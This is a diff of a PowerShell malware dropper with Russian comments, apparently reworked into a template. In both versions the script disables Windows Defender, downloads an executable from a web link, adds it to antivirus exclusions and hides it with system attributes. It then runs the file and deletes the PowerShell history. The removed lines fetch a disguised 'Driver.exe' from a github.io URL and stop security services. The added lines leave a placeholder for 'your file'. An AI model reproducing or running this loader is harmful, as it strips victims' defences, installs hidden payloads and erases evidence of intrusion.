@@ -1,17 +1,14 @@
-Import-Module BitsTransfer;
+Import-Module BitsTransfer; # <--- НЕ ТРОГАТЬ
 
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1;
-Set-MpPreference -DisableRealtimeMonitoring $true;
-Set-Service -Name "wscsvc" -Status stopped -StartupType disabled;
-Set-Service -Name "WinDefend" -Status stopped -StartupType disabled;
-Set-Service -Name "SecurityHealthService" -Status stopped -StartupType disabled;
-Start-BitsTransfer -Source "https://sumhex151.github.io/upO%20Builder%200.9.7.exe" -Destination "$env:ProgramData\Microsoft\Driver.exe";
-Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Driver.exe";
-Set-ItemProperty -Path "$env:ProgramData\Microsoft\Driver.exe" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System);
-Start-Process "$env:ProgramData\Microsoft\Driver.exe";
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1; # отключение антивируса Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true; # отключение антивируса Windows Defender
+Start-BitsTransfer -Source "ПРЯМАЯ ССЫЛКА НА ВАШ ФАЙЛ" -Destination "C:\Users\Public\updater.exe"; # вставьте прямую ссылку на скачивание вашего файла
+Add-MpPreference -ExclusionPath "C:\Users\Public\updater.exe"; # добавление файла в исключения антивируса Windows Defender
+Set-ItemProperty -Path "C:\Users\Public\updater.exe" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System); # скрываем файл, устанавливаем ему атрибут Скрытный + Системный
+Start-Process "C:\Users\Public\updater.exe"; # запуск файла
 
 if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force # удаление истории PowerShell, лучше не трогать
 }
 
 exit
